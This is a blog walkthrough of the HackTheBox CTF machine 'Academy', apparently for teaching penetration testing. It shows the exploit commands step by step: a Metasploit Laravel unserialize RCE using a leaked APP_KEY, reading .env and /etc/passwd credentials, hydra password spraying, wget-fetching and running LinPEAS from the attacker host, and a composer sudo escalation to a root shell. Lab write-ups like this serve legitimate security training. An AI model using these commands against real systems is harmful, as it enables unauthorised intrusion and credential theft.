<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Academy HackTheBox Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/academy-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-03-08T14:08:50+00:00">March 8, 2021</time><time class="updated" datetime="2025-06-22T10:48:18+00:00">June 22, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to crack a machine called the Academy. It was created by egre55 &amp; mrb3n. This is a Capture the Flag type of challenge. This machine is hosted on HackTheBox. Let’s get cracking!</span></p>
<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
<ul>
<li><span style="color: #000000;">Nmap Scan</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Enumerating Virtual hosts</span></li>
<li><span style="color: #000000;">Browsing HTTP Service in Browser</span></li>
<li><span style="color: #000000;">Registering into Application</span></li>
<li><span style="color: #000000;">Exploiting Parameter Tampering for Administrator Access</span></li>
<li><span style="color: #000000;">Directory Bruteforce using dirb</span></li>
<li><span style="color: #000000;">Enumerating Admin pages</span></li>
<li><span style="color: #000000;">Enumerating Virtual Host</span></li>
<li><span style="color: #000000;">Enumerating Laravel PHP Framework</span></li>
<li><span style="color: #000000;">Extracting APP_KEY</span></li>
<li><span style="color: #000000;">Searching for the exploit on Searchsploit</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Exploiting Unserialize RCE using Metasploit</span></li>
<li><span style="color: #000000;">Enumerating DB Password</span></li>
<li><span style="color: #000000;">Reading /etc/passwd file</span></li>
<li><span style="color: #000000;">Password Spraying using Hydra</span></li>
<li><span style="color: #000000;">Logging in as cry0l1t3</span></li>
<li><span style="color: #000000;">Reading User Flag</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Uploading and Executing LinPEAS</span></li>
<li><span style="color: #000000;">Enumerating Logs for credentials of mrb3n user</span></li>
<li><span style="color: #000000;">Logging in as mrb3n user</span></li>
<li><span style="color: #000000;">Enumerating Sudo permissions</span></li>
<li><span style="color: #000000;">Exploiting Sudo Permissions on the composer</span></li>
<li><span style="color: #000000;">Getting Root Shell</span></li>
<li><span style="color: #000000;">Reading the Root Flag</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #800000;">Walkthrough</span></h3>
<h3><span style="color: #800000;">Network Scanning</span></h3>
<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machine hosted on HackTheBox have a static IP Address.</span></p>
<p><span style="color: #000000;"><strong>IP Address assigned: 10.129.106.234</strong></span></p>
<p><span style="color: #000000;">Now that we have the IP Address. We need to enumerate open ports on the machine. For this, we will be running a nmap scan.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p- -sC -sV 10.129.106.234</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6RavGaBzZVY/YEYrXdlOrQI/AAAAAAAAugE/LuRWW6DZ_7sc57mGma5dW56dU20N3SOEACLcBGAsYHQ/s16000/1.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration </strong></span></h3>
<p><span style="color: #000000;">From the nmap scan of port 80, we can see that it is trying to redirect to http://academy.htb/ So let’s add this link into our etc/hosts file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/hosts
10.129.106.234 academy.htb</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6ezI9SD3HCU/YEYsgWhAKcI/AAAAAAAAugM/mgSwKP8Yh5EcmTbjUM2kJA3X4RB6T6rXwCLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">Since we have added the host, we can now see the website in the browser. It is the clone of the HTB Academy Website.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://academy.htb</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fIkwheOPKHA/YEYsjxDPuOI/AAAAAAAAugQ/gj8Q2OlAwicR1jd0BtRv-MEJZUOQ0K-bwCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">Among the broken links, there was a register.php page. We tried to register on the application. It is always a good practice to use Burp To inspect the requests being sent to the server to understand the working of the application.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://academy.htb/register.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Hfp8fDrl80g/YEYsok_ZV1I/AAAAAAAAugU/8DbjGVH99Z0ticr-1ehIopk7oyoIwazHQCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">We found that apart from the username, password there is a parameter of role d that is travelling as well to the roiled server. It has the value of 0 by default.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vmahACqRyOw/YEYsufxlBGI/AAAAAAAAugY/qM3IQyzLnkUxGFEzmhfR9SGlW-v1V2rDwCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">We tried changing the value to 1 to see if we get some additional access on the application</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yt68X2sHb34/YEYsywXU6ZI/AAAAAAAAugg/jl_jAtlt32gDsCkkw1DoyMqak-dD3YQKwCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">The basic application remains the same as shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-P05oh3pEE60/YEYs3EL3YKI/AAAAAAAAugo/MOsuvAz5LocR0p_Rh9WzRwYTKyvpVc3oACLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">We performed a directory Bruteforce in order to detect any high privilege pages or some sensitive pages with information. This led us to the admin.php page.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://academy.htb
http://academy.htb/admin.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JcyCjvn7FQM/YEYs7ApUqII/AAAAAAAAugw/SPTiESNG0xs3CPvbL3JvgjXvHy6RpkpoQCLcBGAsYHQ/s16000/8.1.png"/></span></p>
<p><span style="color: #000000;">We open the detected page and we found a hostname “dev-staging-01.academy.htb”.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://academy.htb/admin-page.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-McLfANiEk28/YEYtAeOiitI/AAAAAAAAug0/VZkgDe6KyBE_HC-4MaMwABILaBk005YnQCLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">We add this hostname in our /etc/hosts file corresponding to the IP address as before.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/hosts
10.129.106.234 academy.htb dev-staging-01.academy.htb</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tu8GSAJGXgY/YEYtD_9taQI/AAAAAAAAug4/VrGKxZfTXFYh9js8jbb1erd0o0Zh6BIhwCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">Now we try to browse the dev-staging-01.academy.htb to find that it is reverting an Internal Server Error. There are some paths visible that suggest that Laravel is working behind the scenes. Also, we try to enumerate the browser console to find the Environment Variables. IT states that App_name is indeed Laravel and there is a base64 encoded key here. It also contains a ton of other information.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://dev-staging-01.academy.htb
Laravel
APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BHdtIUeY8hw/YEYtHfXOb2I/AAAAAAAAug8/fMoTt5VqAcMzzjEuDPUqgbwpSOtlZlUAQCLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">Since we know the Laravel Framework is at works, we decided to search for it in the Searchsploit. We found a Unserialize Command Execution.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">searchsploit Laravel</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7EXr1XmMkZU/YEYtMUOM8yI/AAAAAAAAuhE/dkpfiO7EPjQJOO8m3jn7HllEH-VwjCqywCLcBGAsYHQ/s16000/11.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
<p><span style="color: #000000;">As it is present inside the Metasploit, we use it from there. Here it requires the IP Address of the Target Machine, IP Address of the Attacker Machine, The Base64 APP key we found earlier, the Virtual Host that is running Laravel. After providing all the data, we execute the payload.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/unix/http/laravel_token_unserialize_exec
set rhosts 10.129.106.234
set lhost 10.10.14.80
set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
set vhost dev-staging-01.academy.htb
exploit
python3 -c 'import pty;pty.spawn("bash")'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-D-AX-UEABpc/YEYtQeGtAgI/AAAAAAAAuhI/XcMgNQYwQYAWxW7KyLPTiWlUJezv_l12QCLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">Through the RCE, we get ourselves a shell. We converted it into a TTY shell using a python one-liner. The shell we got is for the user www-data. We started our enumeration of the machine in order to find a way to elevate privilege. This led us to the academy directory in the <strong>/var/www/html</strong> folder. Here we found a hidden directory by the name of .env. We read the .env file to find the DB Credentials of MySQL</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /var/www/html/
cd academy
cat .env
DB_PASSWORD=mySup3rP4s5w0rd!!</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TPKo9B0o24U/YEYtUjqN9qI/AAAAAAAAuhQ/Mm85t-DyV2sWThO34GQWEXcIeMtocPMXQCLcBGAsYHQ/s16000/15.png"/></span></p>
<p><span style="color: #000000;">We read the /etc/passwd file to collect the users for the SSH login.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /etc/passwd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-THvLLgV-pMc/YEYtaAYeo4I/AAAAAAAAuhY/KtfzgKNxrugjj3Yq9nzwGxGuxSW5BVuSwCLcBGAsYHQ/s16000/16.png"/></span></p>
<p><span style="color: #000000;">Then, we took the usernames found and created a dictionary by the name of user.txt and we took the DB password that we found and pasted it into a text file by the name of pass.txt. Now we will perform Password Spraying on all the users to see if any one user has the same password for the ssh login. We will do this using hydra tool. Hydra told us that the user cry0l1t3 has the password that we were looking for.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">hydra -L user.txt -P pass.txt 10.129.106.234 ssh
cry0l1t3
mySup3rP4s5w0rd!!</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-R_zryc3q62o/YEYtebOwA1I/AAAAAAAAuhg/c8nilI9BSLgzuMk37l3R5LMapdrK6AHUgCLcBGAsYHQ/s16000/17.png"/></span></p>
<p><span style="color: #000000;">We logged in through ssh for user cry0l1t3. Again, we convert the shell into a TTY shell and then looked for the user flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh cry0l1t3@10.129.106.234
mySup3rP4s5w0rd!!
python3 -c 'import pty;pty.spawn("bash")'
cd /home/cry0l1t3
cat user.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gKMe_kNGNsA/YEYtjWSjC0I/AAAAAAAAuho/InDGzeNMOt4ChbDAvlsx-09HJgMuekv-wCLcBGAsYHQ/s16000/18.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">Now in order to elevate privilege on the Target machine, we will use <span style="color: #0000ff;"><strong>LinPEAS</strong> </span>post exploitation script to enumerate the machine. We already have the script on our local machine, we hosted it on port 8000 and then downloaded it to the target machine using wget inside the /tmp directory. Now we provide it with the appropriate permissions for execution and then LinPEAS.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget 10.10.14.80:8000/linpeas.sh
chmod 777 linpeas.sh
./linpeas.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TuPNVIHkyXU/YEYtn0iBmvI/AAAAAAAAuhw/HsfDaIbSqJYwLkCGRybVFtsTlU39MO0SwCLcBGAsYHQ/s16000/19.png"/></span></p>
<p><span style="color: #000000;">LinPEAS extracted the credentials for the mrb3n user inside the audit logs.</span></p>
<p><span style="color: #000000;"><strong>sh “su mrb3n”,&lt;nl&gt;</strong></span></p>
<p><span style="color: #000000;"><strong>su “mrb3n_Ac@d3my!”,&lt;nl&gt;</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-M9cWfMXTP_I/YEYtsAAz2zI/AAAAAAAAuh4/-nMwylaVMQonWT0qnJBBgUCtrH0papJnwCLcBGAsYHQ/s16000/20.png"/></span></p>
<p><span style="color: #000000;">We use these credentials to login as mrb3n user. Then we convert the shell into a TTY shell and enumerated it for sudo permissions. We found that we can execute a composer with elevated privileges. We are in luck as composer is one of the binaries that are mentioned in the GTFOBins. From there we got the method to get the root shell. Upon following those methods, we get root on the target machine. We read the root flag to conclude the machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mrb3n
mrb3n_Ac@d3my!
python3 -c 'import pty;pty.spawn("bash")'
sudo -l
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3"}}' &gt;$TF/composer.json
sudo composer --working-dir=$TF run-script x
id
cd /root
cat root.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wOPqIV5z6ic/YEYtw3TBoFI/AAAAAAAAuiA/IqhuzSrMjiwHINig3363bReuJI_H0rbXwCLcBGAsYHQ/s16000/23.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Can be Contacted on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
<!-- YARPP Thumbnails -->
<h3>Related posts:</h3>
<div class="yarpp-thumbnails-horizontal">
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/love-hackthebox-walkthrough/" title="Love HacktheBox Walkthrough">
<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">Love HacktheBox Walkthrough</span></a>
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/seal-hackthebox-walkthrough/" title="Seal HackTheBox Walkthrough">
<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">Seal HackTheBox Walkthrough</span></a>
</div>
</div>
            </div><!-- .entry-content -->
            <footer class="post-footer entry-footer">
                                                
            </footer><!-- .entry-footer -->
            
	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/linux-privilege-escalation-automated-script/" rel="prev">Linux Privilege Escalation: Automated Script</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/" rel="next">A Little Guide to SMB Enumeration</a></div></div>
	</nav>        </div>
